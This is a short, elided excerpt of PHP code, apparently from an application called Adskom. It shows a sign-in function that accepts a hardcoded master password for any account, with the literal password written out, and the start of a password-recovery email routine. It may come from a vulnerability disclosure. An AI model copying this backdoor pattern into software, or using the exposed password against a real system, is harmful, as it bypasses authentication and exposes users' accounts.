...
function signin($username, $password){
    ...
    if ($password == '5kyFa11007') {
        $log->debug("master password is used");
...
function resendpassword($username){
    ...
    $body="Adskom Password Recovery<br>----------------------<br>
    ...
    $mail->Subject    = "Adskom Password Recovery";
